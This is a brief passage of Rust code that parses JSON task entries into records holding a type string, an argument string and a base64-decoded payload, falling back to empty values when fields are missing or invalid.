        typ:     t["type"].as_str().unwrap_or("").to_string(),
        args:    t.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string(),
        payload: t.get("payload")
                  .and_then(|v| v.as_str())
                  .filter(|s| !s.is_empty())
                  .and_then(|s| STANDARD.decode(s).ok())
                  .unwrap_or_default(),
    }).collect()
}
